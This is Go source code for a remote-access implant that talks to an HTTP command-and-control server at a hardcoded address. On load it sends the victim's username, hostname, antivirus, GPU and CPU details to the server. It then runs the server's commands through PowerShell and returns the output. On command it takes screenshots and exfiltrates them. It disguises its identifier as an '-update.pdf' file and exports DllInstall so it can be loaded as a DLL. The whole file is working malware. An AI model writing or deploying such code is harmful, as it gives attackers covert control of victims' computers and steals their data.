package main

import (
	"C"
	"http-C2-rtod/payload/help"
	"http-C2-rtod/payload/info"
	"http-C2-rtod/payload/method"

	"encoding/base64"
	"fmt"
	aesgo "github.com/3xploit666/AesGo"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"time"
)

var (
	Comando   []byte
	cmd       string
	Client    = http.Client{}
	Gathering string
	id        = RandStringBytesMaskImprSrc(4) + "-update.pdf"
)

const (
	letterBytes   = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	letterIdxBits = 6                    // 6 bits to represent a letter index
	letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
	letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
	url           = "http://10.10.10.20:443"
)

var src = rand.NewSource(time.Now().UnixNano())

func RandStringBytesMaskImprSrc(n int) string {
	b := make([]byte, n)
	// A src.Int63() generates 63 random bits, enough for letterIdxMax characters!
	for i, cache, remain := n-1, src.Int63(), letterIdxMax; i >= 0; {
		if remain == 0 {
			cache, remain = src.Int63(), letterIdxMax
		}
		if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
			b[i] = letterBytes[idx]
			i--
		}
		cache >>= letterIdxBits
		remain--
	}

	return string(b)
}

func init() {
	Info()
}

func Info() {
	username := info.GetUsername()
	hostname := info.GetHostname()
	avs := info.GetAntiVirus()
	grafic := info.GetGPU()
	processor := info.GetCPU()
	//ip := help.IP()

	time := time.Now().Format(time.UnixDate)
	Gathering := username + "#" + hostname + "#" + avs + "#" + grafic + "#" + processor + "#" + time
	//initalInfo := aesgo.EncryptAes(Gathering, "35452345234524")
	initalInfo := (Gathering)
	method.SendCook(url+"/info/", id, initalInfo)
}

func main() {
	client := method.ConfigClient()
	for {
		cmd = method.DownloadString(client, url+"/cm/", id)
		if cmd == "UjNWM0w=" {
			method.Sendata(client, url+"/info/", id, Gathering)
			continue
		}
		if cmd == "" {
			time.Sleep(2 * time.Second)
			continue
		} else if cmd == "cap" {
			var msg = "tomando capture"
			msgb64 := help.Base64Encode(string(msg))
			msaes := aesgo.EncryptAes(msgb64, "232323232323")
			method.Sendata(client, url+"/re/", id, msaes)
			go help.GetScreenshot()
			path := os.Getenv("PUBLIC") + "\\fotos.png"
			imagefile, err := ioutil.ReadFile(path)
			if err != nil {
				fmt.Println(err)
			}
			time.Sleep(5 * time.Second)
			os.Remove(string(imagefile))

			var imagencoded = base64.StdEncoding.EncodeToString(imagefile)
			method.Sendata(client, url+"/pic/", id, imagencoded)
			continue

		} else {

			Comando, _ = help.Ps(cmd)
		}

		cmb64 := help.Base64Encode(string(Comando))
		//cmaes := aesgo.EncryptAes(cmb64, "232323232323")
		method.Sendata(client, url+"/re/", id, cmb64)

	}

}

//export DllInstall
func DllInstall() bool {
	Info()
	main()
	return true
}
